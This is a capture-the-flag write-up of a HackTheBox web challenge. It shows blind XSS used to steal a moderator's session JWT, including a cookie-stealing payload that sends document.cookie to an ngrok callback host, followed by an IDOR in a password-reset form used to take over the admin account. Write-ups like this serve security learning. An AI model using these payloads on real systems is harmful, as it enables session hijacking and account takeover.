# Kryptos Support (web 300 points) 

## Description

>The secret vault used by the Longhir’s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?

## Resources

Docker instance provided when you start the challenge

## Solution

Navigating to the website you are presented with a Kryptos Vault Support page that contains text about submitting tickets, with an input box and a submit button. Submitting garbage as a test doesn't return anything of value. The text on the page changes to say that an admin will view the ticket shortly. Nothing is refelcted or rendered back on the page.

In the top left corner is a button labelled "backend" that links to a /login page. I fiddled with some genereic SQLi commands but again the feedback is well sanitised so i cannot glean any information like user enumeration etc.

I'm going to assume that this is a Cross-Site Scripting (XSS) challenge referred to as Blind XSS as there is no feedback on the page as to what my commands are doing. This means i am going to need to spin up a server and host a page to catch callbacks that i will insert as a payload into the input field.

I have never used ngrok before so i am testing it out on this challenge.

I'm going to spin up a python simple server to complete the circuit with the ngrok forwarding address.

```
python3 -m http.server
```
Gives the response 
>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

ngrok BXSS hosting tool. The following command will create a redirect URL linking to port 8000 on my local host, becuase thats where my python simple server is listening. The screenshot shows the output from the command. A URL is provided which redirects to your local machine. you'll need to copy that for your payload. The web interface at port 4040 will handle of the callbacks it receives and display the headers and information. This is where we will view the information we catch from out payload.

```
ngrok http 8000
```

<p align="center"><img src="_images/1ngrok.png"></p>

With that set, its time for a payload now and then we can check if we caught a callback from the Kryptos Support Team.

[Here is a great reference for BXSS commands/payloads](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)

payload:  

```
"><script src="https://56f5-59-102-23-9.au.ngrok.io"</script>
```
Receives a callback which can be viewed on the ngrok web interface, so it's all working. Now we just need to add something malicious to the payload that we can exploit. Let's see if we can get a user cookie.

```
<img src=x onerror="this.src='https://62ce-59-102-23-9.au.ngrok.io?'+document.cookie; this.removeAttribute('onerror');">
```

<p align="center"><img src="_images/1payload.png"></p>

Checking the web interface we can see that we captured a JSON Web Token (JWT), this can be used to authenticate as that user.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI5NjM5OTB9.Lrlo9B0Y11no7QXnxOaBJR6yPJunho4PWEnS31S1Mh4
```

<p align="center"><img src="_images/2cookie.png"></p>

We can run the JWT through [jwt.io](https://jwt.io/) to decode and see what it contains. We can see here that the username is "Moderator" and there is also a user ID "UID=100". This will probably be handy later.

<p align="center"><img src="_images/3jwt.png"></p>

Having a look through the source and javascript files, i found the function that creates the POST when you click submit. The POST is sent to "/API/tickets/add" so now we have an API endpoint. 

<p align="center"><img src="_images/4tickets.png"></p>

Lets create a cookie in our browser using the captured JWT and navigate to /tickets to see if we can log in as "Moderator". Open the developer options with F12, navigate to the tab containing cookies which varies between browsers. Then create a new cookie with the name "session" and paste the captured JWT into the value column. Success, you can see here we are logged in as Moderator and now we have access to the submitted support tickets. 

<p align="center"><img src="_images/5cookieAuthenticate.png"></p>

There is nothing we can do with the tickets but there is a "Settings" button in the top left which links us to a password reset page.

<p align="center"><img src="_images/6settings.png"></p>

This page provides a password change functionality without requiring the current password. Viewing the page source shows hidden UID field with the value 100, which we know is for the user "moderator".

<p align="center"><img src="_images/7changePasswordParams.png"></p>

I'm going to try and change this value to change the password for the admin since moderator hasn't given us access to the flag. Admins are usually UID=1. Close ngork and python server, load burpsuite. Turn the intercept on and i submitted a password reset for moderator and intercepted the request. You can see the new password that i set "password123" along with the UID=100 parameter. Perfect, we should be able to escalate privileges here.

<p align="center"><img src="_images/8uid100.png"></p>

Generate a new password reset request in the browser and hit submit. Intrercept the request in burp and change the UID to '1'.

<p align="center"><img src="_images/8uid1.png"></p>

You get the following message in the browser saying we successfully changed the admins password.

<p align="center"><img src="_images/9adminChanged.png"></p>

Navigate to the login page and authenticate using the username admin and the password you just set.

<p align="center"><img src="_images/flag.png"></p>

## Flag = HTB{x55_4nd_id0rs_ar3_fun!!}
